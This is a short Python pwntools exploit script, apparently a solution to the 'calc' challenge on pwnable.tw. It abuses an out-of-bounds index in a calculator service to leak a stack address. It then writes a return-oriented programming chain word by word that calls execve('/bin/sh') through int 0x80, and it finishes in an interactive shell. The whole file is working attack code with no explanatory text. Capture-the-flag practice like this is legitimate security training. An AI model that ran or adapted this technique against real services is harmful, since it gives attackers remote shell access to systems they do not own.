from pwn import *

def calc(x):
	if x < 0:
		result = x + 2**32
	else:
		result = x
	return result		


r = remote("chall.pwnable.tw", 10100)
r.recv()

#v1_ebp = 0x5a0
v1_ebp_index = 0x167

pop_eax_ret = 0x0805c34b
pop_ecx_pop_ebx_ret = 0x080701d1
pop_edx_ret = 0x080701aa
int_0x80 = 0x08049a21

value = [0x0805c34b, 0xb, 0x080701d1, 0x0, 0x12345678, 0x080701aa, 0x0, 0x08049a21, 0x6e69622f, 0x0068732f]
#value[4]  = (v0[0x168] & 0xfffffff0) + 0xc

r.sendline("+360+1-1")
s = r.recv()[:-1]
s = int(s) + 2**32
value[4] = (s & 0xfffffff0) + 0xc
#print hex(value[4])

for i in range(len(value)):
	payload = "+" + str(361+i)
	temp = bin(value[i])[2:].zfill(32)
	if temp[0] == "1":
		p1 = "0b" + temp[1:]
		p1 = int(p1, 2) 
		p2 = "0b" + "1"*31
		p2 = int(p2, 2)
		payload += "+" + str(p1)
		payload += "+" + str(p2)
		payload += "+" + "1"
	elif value[i] == 0:
		payload += "-" + "1"
	else:
		payload += "+" + str(value[i])
		payload += "-" + "1"
	#print payload
	r.sendline(payload)
	sleep(1)
	result = r.recv()[:-1]
	result = calc(int(result))
	print hex(result)
r.sendline("q")
r.interactive()


